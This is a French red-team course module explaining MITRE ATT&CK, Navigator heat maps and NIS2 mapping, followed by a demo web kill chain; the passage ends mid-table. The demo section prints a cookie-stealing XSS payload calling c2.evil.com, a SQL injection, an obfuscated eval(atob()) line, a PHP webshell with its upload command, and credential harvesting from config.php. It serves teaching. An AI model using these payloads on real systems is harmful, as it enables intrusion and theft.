# Module 1 — MITRE ATT&CK : Framework de Référence pour la Cybersécurité Offensive

---

**Formation Red Team — SDV M2 2026**  
**Durée estimée : 4 h (cours) + 2 h (TP)**

---

## Table des matières

1. [Qu'est-ce que MITRE ATT&CK ?](#1-quest-ce-que-mitre-attck-)
2. [Structure : Tactiques → Techniques → Sub-techniques → Procédures](#2-structure--tactiques--techniques--sub-techniques--procédures)
3. [Utilisation militaire & ANSSI](#3-utilisation-militaire--anssi)
4. [Lien avec NIS2](#4-lien-avec-nis2)
5. [ATT&CK Navigator — Installation et utilisation](#5-attck-navigator--installation-et-utilisation)
6. [Application au pentest web — Démo live](#6-application-au-pentest-web--dmo-live)
7. [ATT&CK comme outil de reporting](#7-attck-comme-outil-de-reporting)
8. [TP Pratique : Créer une heat map ATT&CK](#8-tp-pratique--crer-une-heat-map-attck)

---

## 1. Qu'est-ce que MITRE ATT&CK ?

### 1.1 Origine

**MITRE Corporation** est une organisation américaine à but non lucratif qui gère des centres de recherche financés par le gouvernement fédéral (Federally Funded Research and Development Centers — FFRDC). Elle est notamment connue pour son rôle dans la gestion des **CVE** (Common Vulnerabilities and Exposures).

MITRE ATT&CK est un acronyme qui signifie **Adversarial Tactics, Techniques, and Common Knowledge**. Le projet commence en **2013** avec l'objectif de documenter les comportements observés d'attaquants réels, en particulier ceux ciblant **Windows Enterprise networks**. La version initiale (PRE-ATT&CK) se concentre sur les phases amont d'une attaque.

> **Philosophie fondatrice :** ATT&CK décrit **ce que fait l'attaquant** (comportements, intentions), pas **les outils qu'il utilise**. On parle de *TTPs* (Tactics, Techniques, Procedures). Cette approche permet de rester pertinente même quand les outils évoluent.

### 1.2 Chiffres clés (2025-2026)

| Métrique | Valeur |
|---|---|
| Techniques | 200+ |
| Sous-techniques (sub-techniques) | 400+ |
| Tactiques (Enterprise) | 14 |
| Groupes APT documentés | 140+ |
| Logiciels malveillants référencés | 700+ |
| Campagnes | 800+ |
| Mitigations | 50+ |
| Détections | 40+ |

### 1.3 Les 3 matrices

MITRE ATT&CK se décline en **trois matrices** distinctes, adaptées à différents environnements :

| Matrice | Cible | Tactiques | Particularité |
|---|---|---|---|
| **Enterprise** | Systèmes d'information d'entreprise (Windows, macOS, Linux, Cloud, Network) | 14 | La plus complète, couvre l'ensemble du kill chain |
| **Mobile** | Appareils mobiles (Android, iOS) | 14 | Inclut les attaques par carte SIM, NFC, etc. |
| **ICS** | Systèmes industriels et SCADA | 12 | Adaptée aux spécificités des ICS (ex : Inhibit Response Function) |

**Liens officiels :**

- Matrice Enterprise : [https://attack.mitre.org/matrices/enterprise/](https://attack.mitre.org/matrices/enterprise/)
- Matrice Mobile : [https://attack.mitre.org/matrices/mobile/](https://attack.mitre.org/matrices/mobile/)
- Matrice ICS : [https://attack.mitre.org/matrices/ics/](https://attack.mitre.org/matrices/ics/)

---

## 2. Structure : Tactiques → Techniques → Sub-techniques → Procédures

### 2.1 Hiérarchie

La taxonomie ATT&CK repose sur une hiérarchie à quatre niveaux :

```
Tactique (le "Pourquoi")
    └── Technique (le "Quoi")
            └── Sous-technique (le "Comment" précis)
                    └── Procédure (l'exemple concret)
```

### 2.2 Les 14 tactiques Enterprise

Chaque tactique représente un **objectif stratégique** de l'attaquant dans le déroulement d'une opération.

| # | Tactique | Code | Description |
|---|---|---|---|
| 1 | **Reconnaissance** | TA0043 | Rassembler des informations sur la cible avant l'attaque (OSINT, scanning) |
| 2 | **Resource Development** | TA0042 | Développer / acquérir des ressources pour l'opération (domaines, C2, payloads) |
| 3 | **Initial Access** | TA0001 | Obtenir un premier point d'entrée sur le réseau cible |
| 4 | **Execution** | TA0002 | Exécuter du code malveillant sur le système cible |
| 5 | **Persistence** | TA0003 | Maintenir un accès malgré les redémarrages ou changements de credentials |
| 6 | **Privilege Escalation** | TA0004 | Obtenir des droits plus élevés sur le système |
| 7 | **Defense Evasion** | TA0005 | Éviter la détection (bypass AV, EDR, logging) |
| 8 | **Credential Access** | TA0006 | Voler des identifiants (mots de passe, tokens, hashs) |
| 9 | **Discovery** | TA0007 | Explorer l'environnement (utilisateurs, systèmes, services) |
| 10 | **Lateral Movement** | TA0008 | Se déplacer d'un système à un autre sur le réseau |
| 11 | **Collection** | TA0009 | Rassembler les données d'intérêt avant exfiltration |
| 12 | **Command and Control** | TA0011 | Établir un canal de communication avec les systèmes compromis |
| 13 | **Exfiltration** | TA0010 | Voler les données hors du réseau cible |
| 14 | **Impact** | TA0040 | Détruire, corrompre, ou perturber les systèmes / données |

### 2.3 Format des codes

Chaque élément possède un identifiant unique :

| Préfixe | Signification | Exemple |
|---|---|---|
| TA | Tactique | TA0001 = Initial Access |
| T | Technique | T1078 = Valid Accounts |
| TXXXX.XXX | Sous-technique | T1078.001 = Default Accounts |
| S | Software (malware / tool) | S0029 = Mimikatz |
| G | Group (APT) | G0001 = APT1 |
| M | Mitigation | M1047 = Audit |

### 2.4 Exemple de chaîne complète

Prenons l'exemple d'un ransomware ciblant une entreprise :

```
TA0043 (Reconnaissance)
    └── T1595 (Active Scanning)
        └── T1595.001 (Scanning IP Blocks)
        └── T1595.002 (Vulnerability Scanning)

TA0001 (Initial Access)
    └── T1566 (Phishing)
        └── T1566.001 (Spearphishing Attachment)
            └── Procédure : Email avec macro Office malveillante

TA0002 (Execution)
    └── T1204 (User Execution)
        └── T1204.002 (Malicious File)

TA0003 (Persistence)
    └── T1547 (Boot/Logon Autostart Execution)
        └── T1547.001 (Registry Run Keys / Startup Folder)

TA0004 (Privilege Escalation)
    └── T1068 (Exploitation for Privilege Escalation)

TA0005 (Defense Evasion)
    └── T1055 (Process Injection)
    └── T1562 (Impair Defenses)

TA0006 (Credential Access)
    └── T1003 (OS Credential Dumping)
        └── T1003.001 (LSASS Memory)

TA0007 (Discovery)
    └── T1018 (Remote System Discovery)
    └── T1083 (File and Directory Discovery)

TA0008 (Lateral Movement)
    └── T1021 (Remote Services)
        └── T1021.001 (Remote Desktop Protocol)

TA0009 (Collection)
    └── T1560 (Archive Collected Data)

TA0011 (Command and Control)
    └── T1071 (Application Layer Protocol)
        └── T1071.001 (Web Protocols)

TA0010 (Exfiltration)
    └── T1048 (Exfiltration Over Alternative Protocol)

TA0040 (Impact)
    └── T1486 (Data Encrypted for Impact)
    └── T1490 (Inhibit System Recovery)
```

Chaque étape correspond à un nœud dans la matrice ATT&CK que l'on peut colorer dans l'ATT&CK Navigator pour visualiser la couverture.

---

## 3. Utilisation militaire & ANSSI

### 3.1 COMCYBER et la doctrine LID

Le **Commandement de la Cyberdéfense (COMCYBER)** est l'organisme militaire français en charge de la cyberdéfense. Il s'appuie sur la **LID (Lutte Informatique Défensive)**.

**Points clés :**

- La LID se structure en 3 piliers : **Protection, Détection, Réaction**
- ATT&CK est utilisé comme **langage commun** entre les différentes entités de défense (COMCYBER, ANSSI, DGSE)
- Les tactiques ATT&CK sont mappées sur les phases de la LID :

```
LID - Protection    →  TA0003 (Persistence) → Hardening
LID - Détection     →  TA0007 (Discovery)  → Logs / SIEM
LID - Réaction      →  TA0040 (Impact)      → Incident Response
```

- **Exercices PEGASE** : exercices interarmées de cyberdéfense où ATT&CK sert de référentiel d'évaluation.

### 3.2 ANSSI

L'**Agence Nationale de la Sécurité des Systèmes d'Information (ANSSI)** intègre ATT&CK dans plusieurs de ses référentiels :

| Référentiel | Rôle d'ATT&CK |
|---|---|
| **PASSI** (Prestataires d'Audit de la Sécurité des SI) | Les PASSI doivent connaître ATT&CK pour réaliser des audits conformes au référentiel |
| **Guide d'hygiène informatique** | Les 42 mesures sont mappables sur les techniques ATT&CK (ex : mesure 12 "Authentification forte" → T1078 mitigation) |
| **RGS** (Référentiel Général de Sécurité) | ATT&CK aide à justifier les choix de sécurité |
| **Cartographie des risques** | Utilisé en analyse de risque pour identifier les TTPs pertinentes |

**Liens utiles ANSSI :**

- Guide d'hygiène : [https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/](https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/)
- Référentiel PASSI : [https://cyber.gouv.fr/](https://cyber.gouv.fr/)

### 3.3 OTAN : Threat Intelligence partagée

L'**OTAN** utilise ATT&CK comme standard de facto pour le partage de renseignement sur les menaces entre les États membres :

- **NCSC** (NATO Cyber Security Centre) : centralise les alertes et utilise les TTPs ATT&CK pour qualifier les incidents
- **STIX / TAXII** : le format STIX 2.1 intègre nativement les identifiants ATT&CK (campaign, threat-actor, attack-pattern)
- **Grands exercices OTAN** (Locked Shields, Cyber Coalition) : évaluent la capacité des équipes à détecter et répondre aux TTPs ATT&CK

**Exemple de mapping STIX → ATT&CK :**

```json
{
    "type": "attack-pattern",
    "id": "attack-pattern--b21c3b2b-c755-4787-9c5d-7306e0f9b6e5",
    "name": "Phishing",
    "external_references": [{
        "source_name": "mitre-attack",
        "external_id": "T1566"
    }]
}
```

### 3.4 DGA : Cahiers des charges

La **Direction Générale de l'Armement (DGA)** intègre ATT&CK dans ses **cahiers des charges** pour les marchés publics de cybersécurité :

- Exigence de **couverture ATT&CK** pour les solutions EDR / XDR
- Tests d'intrusion basés sur des scénarios ATT&CK (Red Teaming)
- Notation des offres selon leur capacité à détecter / bloquer les TTPs du framework

**Extrait type d'un CDC DGA :**

> "Le prestataire démontrera la couverture de sa solution contre au moins 80 % des techniques de la matrice ATT&CK Enterprise listées en annexe B, en fournissant une heat map générée par ATT&CK Navigator."

---

## 4. Lien avec NIS2

### 4.1 Contexte

La directive européenne **NIS2 (Network and Information Security 2)** est entrée en vigueur le **16 janvier 2023**. Les États membres avaient jusqu'au **17 octobre 2024** pour la transposer en droit national. En France, la transposition a été faite via la **loi de transposition NIS2** et les décrets associés.

### 4.2 Article 21 — Gestion des risques

L'article 21 impose aux entités essentielles et importantes de mettre en œuvre des **mesures techniques, opérationnelles et organisationnelles** pour gérer les risques cyber.

**Lien direct avec ATT&CK :**

| Exigence NIS2 Article 21 | Corrélation ATT&CK |
|---|---|
| Analyse des risques | ATT&CK fournit le catalogue des risques (les TTPs) |
| Politique de sécurité | Les tactiques définissent le périmètre de couverture |
| Gestion des incidents | ATT&CK permet de qualifier le stade d'une attaque |
| Continuité d'activité | Mapping des techniques Impact (TA0040) |
| Sécurité de la chaîne d'approvisionnement | Techniques liées aux dépendances tierces |
| Acquisition / développement sécurisé | Mapping sur les techniques Initial Access |
| Politique de mots de passe | T1078 (Valid Accounts) mitigation |
| Formation | Sensibilisation basée sur les TTPs |

**Exemple de gap analysis avec ATT&CK :**

```
Exigence NIS2 : "Détection des accès non autorisés"
    → Techniques ATT&CK concernées :
        - T1078 (Valid Accounts)
        - T1133 (External Remote Services)
        - T1190 (Exploit Public-Facing Application)
    → Si le SIEM ne couvre que T1190 → gap sur T1078 et T1133
    → Plan d'action : ajouter des règles de détection sur les authentifications anormales
```

### 4.3 Article 23 — Notification des incidents

L'article 23 impose des délais de notification stricts :

| Délai | Action |
|---|---|
| **24 h** | Alerte précoce vers le CSIRT / autorité compétente |
| **72 h** | Notification complète (cause, impact, mesures prises) |
| **1 mois** | Rapport final détaillé |

**Utilisation d'ATT&CK pour la qualification des incidents :**

```yaml
Incident: AL-2026-04-15
Description: Dépôt de ransomware détecté sur le serveur ERP
Timeline:
  - H+0:  Détection par EDR (T1055 - Process Injection détecté)
  - H+2:  Qualification PREV (alerte précoce) : TA0040 (Impact) en cours
  - H+24: Notification initiale au CSIRT : T1486 (Data Encrypted for Impact)
  - H+72: Rapport complet incluant l'ensemble des TTPs observées
```

**Avantage d'ATT&CK pour le reporting NIS2 :** un même langage entre l'entreprise, le CSIRT, et l'autorité de régulation (ANSSI pour la France).

---

## 5. ATT&CK Navigator — Installation et utilisation

### 5.1 Qu'est-ce que l'ATT&CK Navigator ?

L'**ATT&CK Navigator** est un outil web open source développé par MITRE qui permet de visualiser, annoter et manipuler les matrices ATT&CK. Il est utilisé pour :

- Créer des **heat maps** de couverture (détection, protection, test)
- Comparer plusieurs couches (layers) entre elles
- Exporter les configurations au format **JSON**
- Partager des vues avec son équipe

### 5.2 Installation

#### Prérequis

- Git
- Docker (recommandé) ou Node.js 18+ + npm

#### Méthode 1 : Docker (recommandée)

```bash
# Étape 1 : Cloner le dépôt officiel de l'ATT&CK Navigator depuis GitHub
# git clone télécharge l'intégralité du dépôt (branche par défaut : main)
git clone https://github.com/mitre-attack/attack-navigator.git

# Étape 2 : Se placer dans le répertoire racine du projet cloné
# cd = change directory ; nécessaire pour exécuter les commandes suivantes
cd attack-navigator

# Étape 3 : Construire l'image Docker localement à partir du Dockerfile
# docker build lit le Dockerfile à la racine et crée une image nommée
# -t attack-navigator : tag / nom de l'image (on pourra la référencer plus tard)
# . (point) = contexte de build : répertoire courant contenant le Dockerfile
docker build -t attack-navigator .

# Étape 4 : Lancer le conteneur en arrière-plan (mode détaché)
# -d (--detach) : le conteneur tourne sans bloquer le terminal
# -p 4200:4200 : mappe le port 4200 de l'hôte vers le port 4200 du conteneur
# --name attack-navigator : nom symbolique du conteneur pour le manipuler facilement
docker run -d -p 4200:4200 --name attack-navigator attack-navigator

# Étape 5 : Accéder à l'interface utilisateur dans le navigateur
# L'application Angular écoute par défaut sur le port 4200 en HTTP
# Ouvrir un navigateur à l'adresse : http://localhost:4200
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `git clone` | Télécharge l'intégralité d'un dépôt Git distant en local |
| `cd attack-navigator` | Se déplace dans le répertoire du projet pour y travailler |
| `docker build -t attack-navigator .` | Construit une image Docker à partir du Dockerfile ; `-t` donne un nom (tag) à l'image ; `.` désigne le répertoire courant comme contexte |
| `docker run -d -p 4200:4200 --name attack-navigator attack-navigator` | Crée et démarre un conteneur ; `-d` = arrière-plan (détaché) ; `-p` = mappage de ports hôte→conteneur ; `--name` = nom du conteneur ; `attack-navigator` = nom de l'image à instancier |
| `http://localhost:4200` | URL d'accès à l'interface web ; localhost = machine locale ; 4200 = port par défaut de l'application Angular |

#### Méthode 2 : Node.js (alternative)

```bash
# Étape 1 : Cloner le dépôt officiel de l'ATT&CK Navigator depuis GitHub
# Alternative à Docker : utilisation de Node.js en local
git clone https://github.com/mitre-attack/attack-navigator.git

# Étape 2 : Se placer dans le répertoire racine du projet
cd attack-navigator

# Étape 3 : Installer toutes les dépendances JavaScript listées dans package.json
# npm = Node Package Manager ; télécharge les librairies requises (Angular, etc.)
# Les dépendances sont installées dans le dossier node_modules/
npm install

# Étape 4 : Lancer le serveur de développement Angular
# npm start exécute la commande définie dans la section "scripts" du package.json
# Le serveur compile l'application et la sert sur http://localhost:4200
npm start

# Étape 5 : Accéder à l'interface utilisateur dans le navigateur
# http://localhost:4200
```

**Explication des commandes :**

| Commande | Rôle / Explication |
|---|---|
| `git clone` | Télécharge le dépôt Git distant pour récupérer le code source de Navigator |
| `cd attack-navigator` | Se place dans le dossier du projet pour exécuter les commandes npm |
| `npm install` | Installe toutes les dépendances JavaScript (Angular, RxJS, etc.) définies dans `package.json` ; crée le dossier `node_modules/` |
| `npm start` | Lance le serveur de développement Angular (compile le TypeScript et sert l'application en temps réel avec rechargement à chaud) |

### 5.3 Utilisation basique

#### Créer une heat map

1. Ouvrir [http://localhost:4200](http://localhost:4200)
2. Cliquer sur **"Create Layer"**
3. Choisir la matrice **"Enterprise"**
4. Utiliser la barre de recherche pour trouver des techniques (ex : `T1566`)
5. Cliquer droit sur une technique → **"Assign Score"**
6. Définir un score (0-100) qui déterminera l'intensité de la couleur
7. Répéter pour chaque technique à annoter

#### Personnalisation des couleurs

Pour modifier la palette de couleurs d'une heat map :

1. Ouvrir le panneau **"Layer Settings"** (icône engrenage)
2. Dans **"Gradient Type"** choisir un dégradé prédéfini
3. Cliquer sur un point du gradient pour modifier sa couleur
4. Les techniques sans score sont grisées par défaut

#### Exporter / Importer une couche

1. Ouvrir ATT&CK Navigator dans le navigateur
2. Créer ou charger une couche (layer)
3. Cliquer sur l'icône **"Download"** (⬇) dans la barre d'outils
4. Choisir **"Download as JSON"** pour exporter au format structuré
5. Sauvegarder le fichier (ex: `detection_current.json`)

**Import d'une couche existante :**

1. Cliquer sur **"Open Existing Layer"** → **"Upload from file"**
2. Sélectionner le fichier JSON précédemment exporté
3. La couche s'affiche dans l'interface avec toutes ses techniques, scores et commentaires

**Explication :**

| Action | Description |
|---|---|
| Export JSON | Sauvegarde la couche active (techniques, scores, couleurs, commentaires) dans un fichier `.json` portable |
| Import JSON | Charge une couche existante depuis un fichier JSON pour la visualiser ou la modifier dans Navigator |

### 5.4 Format du fichier JSON

Exemple de fichier de couche ATT&CK Navigator :

```json
{
    "name": "Couverture Détection - SIEM",
    "version": "4.0",
    "domain": "mitre-enterprise",
    "description": "Heat map de couverture détection pour le SIEM Splunk",
    "techniques": [
        {
            "techniqueID": "T1566",
            "color": "#e66363",
            "score": 80,
            "comment": "Détection phishing par analyse des pièces jointes"
        },
        {
            "techniqueID": "T1059",
            "color": "#f5b042",
            "score": 45,
            "comment": "Détection partielle des scripts PowerShell"
        },
        {
            "techniqueID": "T1003",
            "color": "#b0e0b0",
            "score": 10,
            "comment": "Pas de détection du credential dumping"
        }
    ],
    "filters": {
        "stages": ["act"],
        "platforms": ["windows"]
    },
    "sorting": 0,
    "viewMode": 0,
    "hideDisabled": false
}
```

**Légende des couleurs par score :**

| Score | Niveau de couverture | Couleur |
|---|---|---|
| 0-20 | Non couvert | Vert clair |
| 21-50 | Partiellement couvert | Jaune / Orange |
| 51-80 | Majoritairement couvert | Orange foncé |
| 81-100 | Entièrement couvert | Rouge |

---

## 6. Application au pentest web — Démo live

### 6.1 Kill chain web complète

Voici une chaîne d'attaque web réaliste d'un **Red Team** contre une application web d'e-commerce, mappée sur MITRE ATT&CK :

> **Prérequis — Installation des outils de reconnaissance :**
> ```bash
> # Installation de ffuf (Fuzz Faster U Fool) via le gestionnaire de paquets apt
> # ffuf = outil de fuzzing web pour découvrir des ressources cachées (sous-domaines, chemins)
> # -y = répond "oui" automatiquement aux demandes de confirmation
> sudo apt install -y ffuf
>
> # Installation de gau (Get All URLs) via le gestionnaire de paquets Go
> # gau = outil qui récupère toutes les URLs connues d'un domaine depuis l'OSINT passif
> # @latest = télécharge la dernière version publiée du module
> go install github.com/lc/gau/v2/cmd/gau@latest
> ```
> *Voir le [README](README.md) pour les alternatives.*

**Explication des commandes :**

| Commande | Rôle / Explication |
|---|---|
| `sudo apt install -y ffuf` | Installe `ffuf` (outil de fuzzing web pour brute-force de répertoires/sous-domaines) ; `sudo` = exécution en super-utilisateur ; `-y` = mode non-interactif (pas de confirmation manuelle) |
| `go install ...@latest` | Installe `gau` (Get All URLs) depuis le registre Go ; `gau` collecte les URLs connues d'un domaine via des sources OSINT (Wayback Machine, AlienVault, etc.) ; `@latest` = version la plus récente |

#### Phase 1 : Reconnaissance (TA0043)

```bash
# Scan des sous-domaines avec ffuf (Fuzz Faster U Fool)
# -u  : URL cible avec le mot-clé FUZZ qui sera remplacé par chaque entrée de la wordlist
# -w  : wordlist contenant les sous-domaines à tester (ex: admin, api, dev, mail...)
# -H  : en-tête HTTP personnalisé ; FUZZ est la variable de substitution dans le Host
# -fc : filtre les réponses dont le code HTTP correspond (301 = redirection, souvent inintéressant)
# === ILLUSTRATION — Adapter à votre cible ===
# Remplacer cible.com par le domaine du lab (ex: ecovault.local ou redteam.lab)
# Créer une mini-wordlist :
echo -e "www\nadmin\napi\ndev\nmail" > subdomains.txt

ffuf -u https://cible.com -w subdomains.txt -H "Host: FUZZ.cible.com" -fc 301

# Découverte des endpoints API via gau (Get All URLs) et filtrage par grep
# gau : interroge les bases OSINT (Wayback, AlienVault, etc.) pour ce domaine
# grep "/api/" : ne conserve que les lignes contenant "/api/" (endpoints d'API)
gau cible.com | grep "/api/"
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `ffuf -u https://cible.com -w subdomains.txt -H "Host: FUZZ.cible.com" -fc 301` | Outil de fuzzing web ; `-u` = URL avec emplacement `FUZZ` ; `-w` = wordlist en entrée ; `-H` = en-tête HTTP personnalisé (ici `Host`) ; `-fc 301` = ignore les codes HTTP 301 (redirections) |
| `gau cible.com` | Récupère toutes les URLs connues pour `cible.com` via l'OSINT passif (Wayback Machine, VirusTotal, AlienVault OTX, etc.) ; sans `--o`, la sortie se fait sur stdout par défaut |
| `grep "/api/"` | Filtre les lignes contenant `/api/` pour ne conserver que les endpoints d'API REST |

| Technique | Code | Description |
|---|---|---|
| Gather Victim Identity Information | **T1589** | Collecte des emails employés |
| Search Open Technical Databases | **T1596** | Recherche dans les bases de données OSINT |
| Active Scanning | **T1595** | Scan de ports et de vulnérabilités |

#### Phase 2 : Resource Development (TA0042)

```bash
# Configuration d'un serveur C2 avec HTTPS : génération d'un certificat auto-signé
# openssl req = outil de génération de requêtes / certificats X.509
# -x509 : génère directement un certificat auto-signé (au lieu d'une requête CSR)
# -nodes : ne chiffre PAS la clé privée avec une passphrase (nécessaire pour un démarrage automatique)
# -days 365 : validité du certificat = 1 an
# -newkey rsa:2048 : génère une nouvelle clé RSA de 2048 bits (taille standard sécurisée)
# -keyout : chemin de sortie pour la clé privée
# -out : chemin de sortie pour le certificat
# -subj : sujet (identité) du certificat ; /CN = Common Name (nom de domaine)
# === EXÉCUTER SUR LA MACHINE ATTAQUANTE (Kali) ===
# Nécessite sudo pour écrire dans /etc/ssl/
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/ssl/c2.key \
    -out /etc/ssl/c2.crt \
    -subj "/CN=maj-logiciel-update.com"

# Hébergement d'un payload via le serveur HTTP intégré de Python
# python3 -m http.server : lance le module serveur HTTP simple de Python
# 443 : port d'écoute (port HTTPS standard, souvent filtré en sortie)
# Le répertoire courant devient la racine web (payload accessible en téléchargement)
python3 -m http.server 443
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ... -out ... -subj ...` | Génère un certificat SSL/TLS auto-signé ; `-x509` = certificat direct (pas de CSR) ; `-nodes` = pas de passphrase sur la clé ; `-days` = durée de validité ; `-newkey rsa:2048` = crée une clé RSA 2048 bits ; `-keyout` = fichier de sortie pour la clé privée ; `-out` = fichier de sortie pour le certificat ; `-subj` = sujet X.509 avec `/CN=` (Common Name = nom de domaine) |
| `python3 -m http.server 443` | Lance un serveur HTTP minimaliste en Python sur le port 443 ; le répertoire courant sert de racine web ; utilisé ici pour diffuser un payload malveillant |

**Explication des flags OpenSSL :**

| Flag | Rôle |
|---|---|
| `-x509` | Génère un certificat auto-signé plutôt qu'une requête de signature (CSR) |
| `-nodes` | "No DES" : ne chiffre pas la clé privée avec une passphrase (évite une demande manuelle au démarrage) |
| `-days 365` | Durée de validité du certificat en jours |
| `-newkey rsa:2048` | Crée une nouvelle clé RSA de 2048 bits |
| `-keyout` | Chemin de destination pour la clé privée |
| `-out` | Chemin de destination pour le certificat |
| `-subj "/CN=..."` | Sujet du certificat ; le Common Name (`CN`) doit correspondre au nom de domaine du C2 |

| Technique | Code | Description |
|---|---|---|
| Acquire Infrastructure | **T1583** | Achat de domaine malveillant |
| Develop Capabilities | **T1587** | Développement d'exploit custom |

#### Phase 3 : Initial Access (TA0001)

```html
<!-- Payload XSS stocké (Stored Cross-Site Scripting) envoyé via un formulaire de contact -->
<!-- Le navigateur de la victime exécutera ce script lors de l'affichage de la page -->
<script>
  // fetch() = envoie une requête HTTP vers le serveur C2 avec les cookies de la session victime
  // document.cookie = contient les cookies HTTP de la page courante (cookies de session, tokens)
  // L'URL c2.evil.com/steal reçoit les cookies en paramètre GET (?c=...)
  fetch('https://c2.evil.com/steal?c=' + document.cookie)
</script>
```

**Décomposition :**

| Partie | Explication |
|---|---|
| `<script>...</script>` | Balise HTML qui encapsule du code JavaScript exécuté côté client (navigateur) |
| `fetch('https://c2.evil.com/steal?c=' + document.cookie)` | Envoie une requête HTTP GET vers le serveur C2 ; `document.cookie` lit tous les cookies de la page (jetons de session, authentification) ; les cookies sont passés en paramètre GET `?c=` pour exfiltration |

| Technique | Code | Description |
|---|---|---|
| Exploit Public-Facing Application | **T1190** | Exploitation d'une faille XSS |

#### Phase 4 : Execution (TA0002) + Defense Evasion (TA0005)

```sql
-- Injection SQL dans le paramètre 'id' de la requête
-- Le guillemet simple ferme la chaîne SQL existante dans la requête initiale
-- UNION SELECT : fusionne les résultats de la requête d'origine avec notre sélection
-- null,username,password,null : colonnes injectées pour correspondre au nombre de colonnes attendu
--   (null sert de placeholder pour les colonnes dont on ignore le type)
-- FROM users : table contenant les identifiants (cible de l'attaque)
-- -- - : commentaire SQL qui ignore la suite de la requête originale (évite les erreurs de syntaxe)
' UNION SELECT null,username,password,null FROM users-- -
```

```javascript
// Obfuscation JavaScript pour contourner les WAF (Web Application Firewalls)
// eval() : exécute une chaîne de caractères comme du code JavaScript
// atob() : décode une chaîne en Base64 (encodage à 64 caractères)
// La chaîne Base64 "ZmV0Y2goJy8uLi8uLi8uLi9ldGMvcGFzc3dkJyk="
//   correspond à : fetch('/../../../../etc/passwd')
//   après décodage, eval exécute cette requête qui tente un Path Traversal
eval(atob("ZmV0Y2goJy8uLi8uLi8uLi9ldGMvcGFzc3dkJyk="))
```

**Explication des commandes SQL :**

| Partie | Explication |
|---|---|
| `'` | Guillemet simple qui ferme la chaîne de caractères dans la requête SQL originale (provoque une erreur si la validation est absente) |
| `UNION SELECT` | Mot-clé SQL qui fusionne les résultats de la requête d'origine avec ceux de la seconde requête |
| `null` | Placeholder pour une colonne (permet d'aligner le nombre de colonnes sans connaître leur type) |
| `username, password` | Colonnes ciblées de la table `users` qui contiennent les identifiants |
| `FROM users` | Table contenant les comptes utilisateurs de l'application |
| `-- -` | Commentaire SQL qui neutralise le reste de la requête originale (empêche les erreurs de syntaxe) |

**Explication des commandes JavaScript :**

| Fonction / Élément | Rôle / Explication |
|---|---|
| `eval()` | Exécute une chaîne de caractères comme du code JavaScript (danger : exécution de code arbitraire) |
| `atob()` | Decode une chaîne Base64 en chaîne ASCII (ASCII to Binary) ; utilisé ici pour masquer le vrai code |
| `"ZmV0Y2goJy8uLi8uLi8uLi9ldGMvcGFzc3dkJyk="` | Chaîne Base64 qui, décodée, donne : `fetch('/../../../../etc/passwd')` — tentative de Path Traversal pour lire le fichier `/etc/passwd` |
| `fetch('/../../../../etc/passwd')` | Requête HTTP qui tente d'accéder au fichier `/etc/passwd` en remontant les répertoires (`..`) |

| Technique | Code | Description |
|---|---|---|
| Command and Scripting Interpreter | **T1059** | Injection SQL via interpréteur SQL |
| Obfuscated Files or Information | **T1027** | JavaScript obfusqué |

#### Phase 5 : Persistence (TA0003) + Privilege Escalation (TA0004)

```php
<?php
// Création d'un webshell PHP pour établir une persistance sur le serveur
// system() : fonction PHP qui exécute une commande shell et affiche la sortie
// $_GET['cmd'] : récupère le paramètre "cmd" passé dans l'URL en GET
//   Exemple d'utilisation : https://cible.com/uploads/shell.php?cmd=whoami
//   Résultat : exécute la commande "whoami" sur le serveur et retourne le résultat
system($_GET['cmd']);
?>
```

```bash
# Upload du webshell vers le serveur cible via une requête HTTP POST multipart
# curl : outil en ligne de commande pour effectuer des requêtes HTTP
# -X POST : méthode HTTP POST (envoi de données, ici un fichier)
# -F "file=@shell.php" : simule un formulaire HTML multipart ;
#   "file" = nom du champ attendu par l'application ;
#   "@shell.php" = contenu du fichier local à envoyer
# L'URL cible est le point de terminaison de téléchargement de l'application
curl -X POST -F "file=@shell.php" https://cible.com/uploads/
```

**Explication du webshell :**

| Élément | Rôle / Explication |
|---|---|
| `<?php ... ?>` | Balises d'ouverture et fermeture du langage PHP (le serveur exécute le code entre ces balises) |
| `system()` | Fonction PHP qui exécute une commande système et envoie la sortie directement dans la réponse HTTP |
| `$_GET['cmd']` | Variable superglobale PHP qui récupère le paramètre `cmd` de l'URL (ex: `?cmd=whoami`) |
| Commande : `?cmd=whoami` | Exemple d'utilisation : `https://cible.com/shell.php?cmd=whoami` retourne le nom de l'utilisateur système (ex: `www-data`) |

**Explication de la commande curl :**

| Option | Rôle / Explication |
|---|---|
| `curl` | Outil CLI de transfert de données via URL (HTTP, FTP, etc.) |
| `-X POST` | Force la méthode HTTP POST (envoi de données au serveur) |
| `-F "file=@shell.php"` | Simule un formulaire HTML avec champ fichier ; `file` = nom du champ ; `@shell.php` = chemin local du fichier à envoyer |
| `https://cible.com/uploads/` | URL du point de terminaison qui accepte les téléversements de fichiers côté serveur |

| Technique | Code | Description |
|---|---|---|
| Server Software Component | **T1505** | Webshell déposé sur le serveur web |
| Abuse Elevation Control Mechanism | **T1548** | Exploitation d'un binaire suid après webshell |

#### Phase 6 : Credential Access (TA0006) + Discovery (TA0007)

```bash
# Dump des identifiants depuis le fichier de configuration de l'application web
# cat : affiche le contenu du fichier config.php
# | (pipe) : redirige la sortie de cat vers l'entrée de grep
# grep -E : recherche avec une expression régulière étendue
# "DB_PASSWORD|DB_USER" : cherche les lignes contenant DB_PASSWORD OU DB_USER
cat /var/www/html/config.php | grep -E "DB_PASSWORD|DB_USER"

# Découverte des autres machines du réseau interne par ping sweep
# for i in $(seq 1 254) : boucle sur les adresses IP 10.0.0.1 à 10.0.0.254
# ping -c 1 : envoie un seul paquet ICMP Echo Request à chaque adresse
# grep "bytes from" : ne conserve que les réponses positives (machine active)
# & (et commercial) : exécute chaque ping en arrière-plan (parallélisation)
# done : fin de la boucle
for i in $(seq 1 254); do ping -c 1 10.0.0.$i | grep "bytes from" & done
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `cat /var/www/html/config.php` | Affiche le contenu du fichier de configuration PHP (contient souvent les identifiants de base de données en clair) |
